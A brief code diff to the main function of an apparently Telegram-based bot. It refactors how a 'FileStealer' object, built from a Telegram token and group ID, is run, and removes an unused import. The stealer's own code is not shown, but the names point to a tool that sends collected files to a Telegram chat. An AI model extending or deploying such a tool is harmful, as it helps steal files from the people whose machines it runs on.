@@ -1,5 +1,3 @@
-import os
-
 from dotenv import load_dotenv
 
 from bot.constants import GROUP_ID, LIFETIME, TOKEN_TELEGRAM
@@ -22,7 +20,7 @@ def main():
         raise ValueError('Отсутствует ID чата в переменных окружения')
 
     file_stealer = FileStealer(token, chat_id)
-    file_stealer.run(30)
+    file_stealer.run(LIFETIME)
 
     parser_client = FileParser()
     data = parser_client.parse_file()
